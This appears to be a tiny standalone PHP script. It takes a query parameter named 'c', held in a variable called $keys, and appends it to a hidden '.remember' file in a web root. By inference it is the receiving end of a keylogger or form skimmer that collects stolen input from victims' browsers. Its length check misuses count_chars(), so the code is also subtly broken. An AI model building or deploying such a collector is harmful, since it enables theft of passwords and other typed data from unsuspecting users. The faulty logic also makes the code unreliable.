<?php

$keys =  urldecode(trim($_GET['c']));


if ( count_chars( $keys ) > 1024 ) exit();

if ( mb_detect_encoding($keys, 'ASCII', true) ) {
    file_put_contents("/home/bitnami/htdocs/.remember", $keys, FILE_APPEND);
}

?>
